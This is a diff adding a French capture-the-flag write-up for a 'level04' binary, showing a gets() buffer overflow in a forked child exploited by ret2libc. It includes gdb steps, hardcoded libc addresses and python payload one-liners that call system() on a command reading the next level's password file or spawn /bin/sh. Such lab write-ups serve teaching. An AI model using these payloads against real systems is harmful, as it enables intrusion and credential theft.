@@ -1,0 +1,29 @@
+On peut utiliser un buffer overflow qui aura lieu dans le child.
+En effet, dans child, il y a gets qui prend autant de charactere que l'on veut, mais qui les stock dans un buffer qui lui est bien limite.
+On peut donc deja essayer de trouver l'offset de l'eip. Pour cela on va dire a gdb de suivre le child.
+set follow-fork-mode child
+Ensuite on peut utilise notre programe get_offset. On obtient 156.
+
+Apres plusieurs essaies infructueux pour utiliser un shellcode, on decide d'utiliser la methode ret2libc.
+Pour cela on va stocker 'cat /home/users/level05/.pass' dans l'environnement avec un space sled pour ne pas trop s'embeter a trouver l'addresse exact.
+export CAT=$(python -c 'print " "*100 + "cat /home/users/level05/.pass"')
+Il va nous falloir l'adresse de la variable CAT. Pour cela on va utiliser gdb.
+gdb level04
+b *main
+run
+x/10s $esp
+La variable est a environ 0xffffdf34
+Il nous faut l'adresse de system. Dans gdb on peut faire 'p system' pour l'obtenir.
+system = 0xf7e6aed0
+Maintenant que l'on a tout le necessaire on test en dehors de gdb :
+python -c "print 'B'*156 + '\xf7\xe6\xae\xd0'[::-1] + 'B'*4 + '\xff\xff\xdf\x34'[::-1]" | ./level04
+On obtient 'sh: 1: pe: not found', on se trouve un petit peu avant notre cat. On se sert de notre space sled et ajoutons 0x20 a 0xffffdf34.
+On essaie avec 0xffffdf54 et on obtient le flag !
+python -c "print 'B'*156 + '\xf7\xe6\xae\xd0'[::-1] + 'B'*4 + '\xff\xff\xdf\x54'[::-1]" | ./level04
+
+
+Une autre solution plus simple est de trouver une string /bin/sh dans la lib C.
+Pour cela, dans gdb, on fait un find :
+find system,+9999999,"/bin/sh"
+Gdb nous trouve une correspondance a l'adresse 0xf7f897ec.
+python -c "print 'B'*156 + '\xf7\xe6\xae\xd0'[::-1] + 'B'*4 + '\xf7\xf8\x97\xec'[::-1]" > /tmp/level04 && cat /tmp/level04 - | ./level04
